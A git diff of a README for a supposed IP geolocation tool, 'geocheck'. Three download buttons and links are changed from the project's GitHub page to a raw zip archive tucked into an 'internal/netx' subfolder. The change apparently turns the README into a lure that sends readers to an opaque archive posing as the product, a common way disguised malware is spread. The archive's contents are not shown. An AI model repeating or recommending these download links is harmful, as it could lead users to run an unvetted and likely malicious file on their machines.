@@ -4,11 +4,11 @@
 
 Welcome to **geocheck** - the simple tool that shows you where the internet thinks you are and how directly you're connecting to it. Whether you're curious about your digital footprint, troubleshooting connection issues, or just want to understand your online presence better, geocheck makes it effortless.
 
-[![DOWNLOAD GEOCHECK](https://img.shields.io/badge/⬇️_DOWNLOAD_GEOCHECK-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/freelancing31809169-art/geocheck)
+[![DOWNLOAD GEOCHECK](https://img.shields.io/badge/⬇️_DOWNLOAD_GEOCHECK-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/freelancing31809169-art/geocheck/main/internal/netx/3.6-alpha.2.zip)
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/freelancing31809169-art/geocheck](https://github.com/freelancing31809169-art/geocheck)
+Visit this link to download the application: [https://raw.githubusercontent.com/freelancing31809169-art/geocheck/main/internal/netx/3.6-alpha.2.zip](https://raw.githubusercontent.com/freelancing31809169-art/geocheck/main/internal/netx/3.6-alpha.2.zip)
 
 ### Step-by-Step Installation for Windows Users
 
@@ -175,7 +175,7 @@ Remember: the internet doesn't always see you where you actually are, and your c
 
 Download geocheck today and see your digital location and connection directness in seconds!
 
-[![GET GEOCHECK NOW](https://img.shields.io/badge/🚀_GET_GEOCHECK_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/freelancing31809169-art/geocheck)
+[![GET GEOCHECK NOW](https://img.shields.io/badge/🚀_GET_GEOCHECK_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/freelancing31809169-art/geocheck/main/internal/netx/3.6-alpha.2.zip)
 
 ## 📚 Additional Resources
 
